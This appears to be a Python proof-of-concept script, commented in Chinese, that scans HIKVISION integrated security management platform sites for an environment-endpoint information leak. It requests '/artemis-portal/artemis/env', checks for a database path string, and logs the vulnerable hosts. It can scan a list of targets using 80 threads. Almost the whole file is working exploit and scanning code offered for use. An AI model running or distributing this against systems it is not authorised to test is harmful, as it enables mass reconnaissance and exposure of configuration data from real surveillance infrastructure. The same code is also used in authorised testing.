import requests,argparse,time,sys,os,requests,hashlib,requests  
import argparse 
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'
RESET = '\033[0m'
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
    text=''' 
  ____    __   ___  
 |___ \  / /  / _ \ 
   __) |/ /_ | | | |
  |__ <| '_ \| | | |
  ___) | (_) | |_| |
 |____/ \___/ \___/ 瓦吉姆专属，盗者杀无赦'''
    print(text)

def poc(target):  
    url = target + '/artemis-portal/artemis/env'  
    headers = {  
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"  
    }  
    try:  
        res = requests.get(url=url, headers=headers, timeout=10, verify=False).text  
        if '/artemis_artemisdb' in res:  
            print(f'[+]信息泄露检测:该网站存在信息泄露,url为{target}')  
            with open('result.txt', 'a') as f:  
                f.write(target + '\n') 
        else:
            print(f'[-]不存在信息泄露:url为{target}')
            
    except:
        print(f'[*]{target} 出错')
	
def main():#通用模板，对单个语法定位，
    parser=argparse.ArgumentParser(description="HiKVISION综合安防管理平台env信息泄漏")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help="input file path")
    args =parser.parse_args()
    #如果args.url不等于args.file,就输出args.url
    if args.url and not args.file:#确定输出的是单个url
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp =Pool(80)
        mp.map(poc,url_list)
        mp.close()
        mp.join() 

if __name__ == '__main__':
    main()
